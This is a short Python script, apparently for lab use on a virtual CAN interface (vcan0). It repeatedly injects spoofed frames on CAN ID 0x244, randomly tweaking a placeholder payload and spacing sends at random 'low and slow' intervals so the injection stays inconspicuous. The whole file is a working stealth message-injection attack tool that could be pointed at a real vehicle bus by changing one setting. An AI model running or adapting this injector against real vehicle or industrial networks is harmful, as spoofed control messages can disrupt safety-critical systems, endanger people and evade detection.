import time, random, can

# 🎯 Target ID (adjust if needed based on your logs)
TARGET_ID = 0x244

# Base payload (you can tweak this later)
BASE_PAYLOAD = bytearray.fromhex("11 22 33 44 55 66 77 88")

# Range for delay between injections (low and slow)
MIN_GAP, MAX_GAP = 1.5, 4.0

bus = can.interface.Bus(channel="vcan0", bustype="socketcan")
print(f"Stealth injector running on ID 0x{TARGET_ID:03X} (Ctrl+C to stop)")

try:
    while True:
        payload = bytearray(BASE_PAYLOAD)
        # small tweak in 1–2 random bytes
        for _ in range(random.randint(1, 2)):
            i = random.randrange(8)
            payload[i] = (payload[i] + random.choice([-1, 1, 2, -2, 16, -16])) & 0xFF

        msg = can.Message(arbitration_id=TARGET_ID, data=payload, is_extended_id=False)
        bus.send(msg)
        print(f"Injected stealth frame on {hex(TARGET_ID)}: {payload.hex()}")
        time.sleep(random.uniform(MIN_GAP, MAX_GAP))

except KeyboardInterrupt:
    print("\nStealth injection stopped.")
